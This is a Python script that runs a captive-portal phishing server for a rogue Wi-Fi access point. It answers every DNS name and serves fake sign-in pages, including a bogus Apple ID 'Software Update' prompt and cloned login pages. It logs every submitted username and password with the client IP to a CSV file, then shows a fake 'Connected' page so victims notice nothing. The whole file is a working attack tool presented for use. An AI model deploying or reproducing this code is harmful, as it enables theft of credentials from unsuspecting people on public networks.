#!/usr/bin/env python3
"""Captive portal for the rogue AP (runs as root, binds :80).

Every DNS name resolves to us (dnsmasq address=/#/...), so any request on any
host/path is this page. The page served is either:

  * a theme picked via /tmp/rogue/theme.json (Free-WiFi sign-in, iPhone
    hotspot, firmware-update, airport) — default "freewifi", or
  * a cloned login page at /tmp/rogue/clone.html if one has been captured
    (Clone-a-login tool), which is served for EVERY path so captive-portal
    probes (hotspot-detect.html, generate_204, …) all land on the clone.

Logging in stores whatever the victim submitted to creds.csv, then shows the
"connected" page so the captive-portal check passes without bouncing them.
"""
import csv
import os
import signal
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

PORTAL_DIR = os.environ.get("ROGUE_DIR", "/tmp/rogue")
CREDS_FILE = os.path.join(PORTAL_DIR, "creds.csv")
THEME_FILE = os.path.join(PORTAL_DIR, "theme.json")
CLONE_FILE = os.path.join(PORTAL_DIR, "clone.html")
SSID = os.environ.get("ROGUE_SSID", "Free-WiFi")

_BASE = """
body{margin:0;background:#0a0f0c;color:#e8ffe8;font-family:system-ui;display:flex;align-items:center;
justify-content:center;min-height:100vh}
.card{background:#071410;border:1px solid #1e4d33;border-radius:16px;padding:28px 24px;width:320px;
box-shadow:0 0 40px rgba(57,255,20,.12)}
h1{font-size:20px;margin:0 0 4px;color:#39ff14;letter-spacing:1px}
p{color:#9febb9;font-size:13px;margin:4px 0 18px}
label{display:block;font-size:12px;color:#34d399;margin:10px 0 4px;text-transform:uppercase;letter-spacing:1px}
input{width:100%;box-sizing:border-box;background:#04100c;border:1px solid #1a4532;color:#eafff0;
border-radius:8px;padding:12px;font-size:15px}
button{width:100%;margin-top:16px;background:#065f46;color:#b7ffe0;border:none;border-radius:8px;
padding:13px;font-size:15px;font-weight:600}
button:active{transform:scale(.97)}
.ok{color:#39ff14;font-size:15px;margin-top:8px}
"""

_LIGHT = """
body{background:#f2f2f7;color:#1c1c1e;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
.card{background:#ffffff;border:1px solid #d1d1d6;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
h1{color:#1c1c1e;letter-spacing:0}
p{color:#6d6d72}
label{color:#3a3a3c;text-transform:none;letter-spacing:0}
input{background:#fff;border:1px solid #c7c7cc;color:#1c1c1e;border-radius:6px}
button{background:#0071e3;color:#fff;border-radius:6px}
"""

THEMES = {
    "freewifi": {
        "css": _BASE,
        "title": "%s",
        "subtitle": "Wi-Fi is ready. To get online, please sign in.",
        "button": "Connect",
        "fields": [
            ("user", "Email or ID", "text", "you@example.com"),
            ("pass", "Password", "password", ""),
        ],
    },
    "iphone-hotspot": {
        "css": _LIGHT,
        "title": "Sign in to network",
        "subtitle": "Enter the password for the Wi-Fi network below.",
        "button": "Join",
        "fields": [
            ("pass", "Wi-Fi Password", "password", "Password"),
        ],
    },
    "firmware": {
        "css": _LIGHT,
        "title": "Software Update",
        "subtitle": ("An update is required before this device can continue. "
                     "Sign in with your Apple ID to start the download."),
        "button": "Update",
        "fields": [
            ("user", "Apple ID", "text", "name@icloud.com"),
            ("pass", "Password", "password", ""),
        ],
    },
    "airport": {
        "css": _LIGHT,
        "title": "Airport Wi-Fi",
        "subtitle": "Complimentary Wi-Fi. Sign in to get online.",
        "button": "Sign in",
        "fields": [
            ("user", "Email", "text", "you@example.com"),
            ("pass", "Password", "password", ""),
        ],
    },
}

THEME_ORDER = ["freewifi", "iphone-hotspot", "firmware", "airport"]


def esc(v):
    import html
    return html.escape(str(v), quote=True)


def _current_theme():
    try:
        with open(THEME_FILE) as f:
            import json
            return json.load(f).get("theme", "freewifi")
    except (OSError, ValueError):
        return "freewifi"


def page_body():
    theme = _current_theme()
    cfg = THEMES.get(theme, THEMES["freewifi"])
    title = cfg["title"].replace("%s", esc(SSID))
    body = ["<h1>%s</h1>" % title, "<p>%s</p>" % esc(cfg["subtitle"])]
    body.append('<form method="post" action="/login">')
    for name, label, ftype, ph in cfg["fields"]:
        body.append("<label>%s</label>" % esc(label))
        body.append('<input type="%s" name="%s" placeholder="%s" '
                    'autocomplete="off" autocapitalize="off" required>'
                    % (ftype, name, esc(ph)))
    body.append('<button type="submit">%s</button></form>' % esc(cfg["button"]))
    return ("<div class=\"card\">%s</div>"
            "<p style=\"margin-top:14px;color:#8e8e93\">Any connection check "
            "will be answered automatically.</p>" % "".join(body))


def ok_body():
    return ("<div class=\"card\"><h1>Connected</h1><p>Welcome to %s. "
            "You can close this tab.</p></div>" % esc(SSID))


def render_page(body, theme=None):
    css = THEMES.get(theme or _current_theme(), THEMES["freewifi"])["css"]
    return ("<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
            "<title>%s — Sign in</title><style>%s</style></head>"
            "<body>%s</body></html>" % (esc(SSID), css, body))


def clone_html():
    """The captured login clone, or None."""
    if not os.path.isfile(CLONE_FILE):
        return None
    try:
        with open(CLONE_FILE, "rb") as f:
            data = f.read()
    except OSError:
        return None
    return data if data.strip() else None


class PortalHandler(BaseHTTPRequestHandler):
    def _reply(self, code, body, ctype="text/html; charset=utf-8"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        clone = clone_html()
        if clone is not None:
            self._reply(200, clone)
            return
        self._reply(200, render_page(page_body()).encode())

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
        except ValueError:
            length = 0
        if length > 8192:
            self._reply(400, b"bad")
            return
        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        if self.path == "/login":
            qs = parse_qs(raw)
            user = (qs.get("user") or [""])[0].strip()
            pw = (qs.get("pass") or [""])[0].strip()
            if user or pw:
                try:
                    os.makedirs(PORTAL_DIR, exist_ok=True)
                    with open(CREDS_FILE, "a", newline="") as f:
                        csv.writer(f).writerow(
                            [time.strftime("%Y-%m-%d %H:%M:%S"),
                             self.client_address[0] if self.client_address else "",
                             SSID, user, pw])
                except OSError:
                    pass
            self._reply(200, render_page(ok_body()).encode())
            return
        clone = clone_html()
        if clone is not None:
            self._reply(200, clone, "application/x-www-form-urlencoded")
            return
        self._reply(200, render_page(page_body()).encode())

    def log_message(self, *a):
        pass


def main():
    sig = [False]

    def _term(*_):
        sig[0] = True
    signal.signal(signal.SIGTERM, _term)
    signal.signal(signal.SIGINT, _term)

    try:
        os.makedirs(PORTAL_DIR, exist_ok=True)
    except OSError:
        pass
    if not os.path.isfile(CREDS_FILE):
        try:
            with open(CREDS_FILE, "w", newline="") as f:
                csv.writer(f).writerow(["time", "client_ip", "ssid", "user", "pass"])
        except OSError:
            pass
    try:
        srv = ThreadingHTTPServer(("0.0.0.0", 80), PortalHandler)
    except OSError as exc:
        sys.stderr.write("portal cannot bind :80: %s\n" % exc)
        return 1
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    theme = _current_theme()
    has_clone = clone_html() is not None
    sys.stderr.write("captive portal up on :80 (ssid=%s theme=%s clone=%s)\n"
                     % (SSID, theme, bool(has_clone)))
    while not sig[0]:
        time.sleep(0.5)
    srv.shutdown()
    return 0


if __name__ == "__main__":
    sys.exit(main())